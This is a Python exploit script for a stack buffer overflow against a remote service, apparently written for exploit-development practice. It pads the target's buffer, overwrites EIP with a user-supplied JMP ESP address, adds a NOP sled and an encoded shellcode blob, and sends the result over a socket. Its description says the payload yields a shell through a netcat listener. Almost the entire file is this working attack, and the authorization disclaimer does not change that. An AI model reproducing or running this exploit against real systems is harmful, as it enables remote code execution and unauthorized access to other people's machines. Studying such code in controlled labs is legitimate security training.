#!/usr/bin/env python3

import sys
import subprocess
import socket
import argparse
import itertools
import struct
from typing import Optional

def main(ip: str, port: int, eip_offset: int, overflow_threshold: int, jmp_address: hex) -> None:
	if eip_offset > overflow_threshold:
		print("The value of the offset cannot be bigger than the overflow threshold")
		sys.exit(0)
	
	# Define prefix and buffer with encoded cyclic pattern
	prefix = b""	# CHANGE
	buffer = b"A" * eip_offset
	eip = struct.pack('<I', jmp_address) # Transforms 0x625011AF into \xAF\x11\x50\x62
	shellcode =  b""
	shellcode += b"\xbb\xc6\xd1\xc7\x04\xdb\xd2\xd9\x74\x24\xf4"
	shellcode += b"\x5a\x29\xc9\xb1\x52\x31\x5a\x12\x03\x5a\x12"
	shellcode += b"\x83\x04\xd5\x25\xf1\x74\x3e\x2b\xfa\x84\xbf"
	shellcode += b"\x4c\x72\x61\x8e\x4c\xe0\xe2\xa1\x7c\x62\xa6"
	shellcode += b"\x4d\xf6\x26\x52\xc5\x7a\xef\x55\x6e\x30\xc9"
	shellcode += b"\x58\x6f\x69\x29\xfb\xf3\x70\x7e\xdb\xca\xba"
	shellcode += b"\x73\x1a\x0a\xa6\x7e\x4e\xc3\xac\x2d\x7e\x60"
	shellcode += b"\xf8\xed\xf5\x3a\xec\x75\xea\x8b\x0f\x57\xbd"
	shellcode += b"\x80\x49\x77\x3c\x44\xe2\x3e\x26\x89\xcf\x89"
	shellcode += b"\xdd\x79\xbb\x0b\x37\xb0\x44\xa7\x76\x7c\xb7"
	shellcode += b"\xb9\xbf\xbb\x28\xcc\xc9\xbf\xd5\xd7\x0e\xbd"
	shellcode += b"\x01\x5d\x94\x65\xc1\xc5\x70\x97\x06\x93\xf3"
	shellcode += b"\x9b\xe3\xd7\x5b\xb8\xf2\x34\xd0\xc4\x7f\xbb"
	shellcode += b"\x36\x4d\x3b\x98\x92\x15\x9f\x81\x83\xf3\x4e"
	shellcode += b"\xbd\xd3\x5b\x2e\x1b\x98\x76\x3b\x16\xc3\x1e"
	shellcode += b"\x88\x1b\xfb\xde\x86\x2c\x88\xec\x09\x87\x06"
	shellcode += b"\x5d\xc1\x01\xd1\xa2\xf8\xf6\x4d\x5d\x03\x07"
	shellcode += b"\x44\x9a\x57\x57\xfe\x0b\xd8\x3c\xfe\xb4\x0d"
	shellcode += b"\x92\xae\x1a\xfe\x53\x1e\xdb\xae\x3b\x74\xd4"
	shellcode += b"\x91\x5c\x77\x3e\xba\xf7\x82\xa9\xcf\x0c\x9a"
	shellcode += b"\xb4\xb8\x10\xa2\xd7\x64\x9c\x44\xbd\x84\xc8"
	shellcode += b"\xdf\x2a\x3c\x51\xab\xcb\xc1\x4f\xd6\xcc\x4a"
	shellcode += b"\x7c\x27\x82\xba\x09\x3b\x73\x4b\x44\x61\xd2"
	shellcode += b"\x54\x72\x0d\xb8\xc7\x19\xcd\xb7\xfb\xb5\x9a"
	shellcode += b"\x90\xca\xcf\x4e\x0d\x74\x66\x6c\xcc\xe0\x41"
	shellcode += b"\x34\x0b\xd1\x4c\xb5\xde\x6d\x6b\xa5\x26\x6d"
	shellcode += b"\x37\x91\xf6\x38\xe1\x4f\xb1\x92\x43\x39\x6b"
	shellcode += b"\x48\x0a\xad\xea\xa2\x8d\xab\xf2\xee\x7b\x53"
	shellcode += b"\x42\x47\x3a\x6c\x6b\x0f\xca\x15\x91\xaf\x35"
	shellcode += b"\xcc\x11\xcf\xd7\xc4\x6f\x78\x4e\x8d\xcd\xe5"
	shellcode += b"\x71\x78\x11\x10\xf2\x88\xea\xe7\xea\xf9\xef"
	shellcode += b"\xac\xac\x12\x82\xbd\x58\x14\x31\xbd\x48"
	nops = b"\x90" * 16 

	payload = b""
	payload_size = eip_offset + len(eip) + len(shellcode) + len(nops)

	if payload_size > overflow_threshold:
		print("The Overflow Threshold is too small, it should have a minimum value of:", eip_offset + len(eip) + len(shellcode) + len(nops))
		sys.exit(0)

	suffix = b"C" * (overflow_threshold - payload_size)

	timeout = 5
	try:
		# Create socket object
		with socket.socket() as s:
			# Connect to target server
			s.connect((ip, port))

			# Set Timeout
			#s.settimeout(timeout)

			# Print server banner
			try:
				response = s.recv(4096)
				print(f"{response.decode()}")
			except:
				pass

			# Send data to the server
			payload = b"".join(
				[
					prefix,
					buffer,
					eip,
					nops,
					shellcode,
					suffix
				]
			)
			print(f"Sending payload...")
			s.send(payload)

			response = s.recv(4096)
			# Print the response from the server
			print(f"Response: {response.decode()}")

	except ConnectionError:
		print('Connection Refused')
		sys.exit(0)
	except:
		print("\n","="*25,"CRASH","="*25,"\n")
		print(payload)
		print(f"Application crashed at {len(payload) - len(prefix)} bytes!")
		sys.exit(0)

if __name__ == "__main__":
	# Parse command line arguments
	parser = argparse.ArgumentParser(
		prog="Nop Sleds",
		description="""This is a Python script for executing a buffer overflow on a target service of a remote server. 
	The script takes five arguments: an IP address, a port number, the EIP offset, an overflow threshold and the address of the JUMP ESP intruction which does not have correct protection applied. 
	After launching a local netcat listener to the port described in the payload we should be able to get a shell on the target server.
	It is intended for use in a controlled testing environment and should not be used to target production systems or networks without proper authorization.""",
		epilog="Have fun experimenting with this tool!"
	)
	parser.add_argument("ip", help="IP address of the target")
	parser.add_argument("port", type=int, help="Port number of the target")
	parser.add_argument("offset", help="Number of bytes inside the buffer until reaching the return address")
	parser.add_argument("overflow_threshold", help="Payload size which is able to crash the target application")
	parser.add_argument("jmp_esp", help="Address of the JMP ESP instruction we uncovered with Mona (ex: 0x625011AF)")
	args = parser.parse_args()

	# Call main function
	main(args.ip, args.port, int(args.offset), int(args.overflow_threshold), int(args.jmp_esp,16))